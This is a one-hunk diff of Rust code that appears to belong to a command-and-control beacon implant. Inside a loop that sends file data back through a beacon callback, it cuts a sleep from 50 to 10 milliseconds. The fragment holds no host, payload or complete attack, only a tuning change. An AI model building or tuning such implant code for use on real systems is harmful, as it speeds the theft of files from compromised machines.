@@ -431,7 +431,7 @@ unsafe fn my_thread_function(file_path: String) -> Result<(), Error> {
         beacon_send_result(&meta_info, &BEACON, CALLBACK_FILE_WRITE).unwrap();
 
         // 休眠 50 毫秒（模拟）
-        thread::sleep(std::time::Duration::from_millis(50));
+        thread::sleep(std::time::Duration::from_millis(10));
     }
     let mut finally_bytes = Vec::new();
     finally_bytes.extend_from_slice(&request_id.to_be_bytes());
